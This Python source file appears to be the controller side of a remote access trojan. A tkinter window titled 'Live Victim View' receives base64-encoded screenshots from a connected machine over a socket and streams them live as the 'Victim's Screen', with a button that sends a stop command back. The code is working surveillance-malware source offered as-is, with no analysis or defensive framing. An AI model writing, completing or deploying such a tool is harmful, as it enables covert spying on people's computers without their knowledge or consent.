import threading
import tkinter as tk
from PIL import Image, ImageTk
import io
import base64
import time
import socket
class LiveVictimGUI:
    def __init__(self, client_socket):
        self.client = client_socket
        self.running = True
        self.root = None
        self.setup()
    def setup(self):
        self.root = tk.Tk()
        self.root.title("Live Victim View - REAL TIME")
        self.root.geometry("900x700")
        self.root.configure(bg="black")
        self.canvas = tk.Canvas(
            self.root,
            bg="black",
            width=850,
            height=600
        )
        self.canvas.pack(pady=10)
        self.status = tk.Label(
            self.root,
            text="LIVE STREAMING - Victim's Screen",
            fg="red",
            bg="black",
            font=("Arial", 12, "bold")
        )
        self.status.pack()
        btn_frame = tk.Frame(self.root, bg="black")
        btn_frame.pack(pady=10)
        self.stop_btn = tk.Button(
            btn_frame,
            text="STOP STREAM",
            command=self.stop_view,
            bg="red",
            fg="white",
            padx=20,
            pady=5,
            font=("Arial", 10, "bold")
        )
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        self.receive_thread = threading.Thread(
            target=self.receive_frames,
            daemon=True
        )
        self.receive_thread.start()
        self.root.protocol("WM_DELETE_WINDOW", self.stop_view)
        self.root.mainloop()
    def receive_frames(self):
        buffer = b"" 
        while self.running:
            try:
                data = self.client.recv(65536)
                if not data:
                    break
                buffer += data
                
                start_marker = b"LIVE_START\n"
                end_marker = b"\nLIVE_END"
                while start_marker in buffer and end_marker in buffer:
                    start_idx = buffer.find(start_marker)
                    end_idx = buffer.find(end_marker, start_idx)
                    if start_idx != -1 and end_idx != -1 and end_idx > start_idx:
                        img_start = start_idx + len(start_marker)
                        img_data = buffer[img_start:end_idx]
                        buffer = buffer[end_idx + len(end_marker):]
                        try:
                            img_bytes = base64.b64decode(img_data)
                            image = Image.open(io.BytesIO(img_bytes))
                            image = image.resize((850, 600), Image.Resampling.LANCZOS)
                            photo = ImageTk.PhotoImage(image)
                            self.root.after(0, self.update_image, photo)
                        except Exception as e:
                            print(f"[DEBUG] Image decode error: {e}")
                            continue
                time.sleep(0.01)
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"[ERROR] Receive failed: {e}")
                break
        if self.running:
            self.root.after(0, self.stop_view)
    def update_image(self, photo):
        try:
            self.canvas.delete("all")
            self.canvas.create_image(425, 300, image=photo, anchor='center')
            self.canvas.image = photo 
        except:
            pass
    def stop_view(self):
        self.running = False
        try:
            self.client.send(b"stop\n")
        except:
            pass
        try:
            self.root.destroy()
        except:
            pass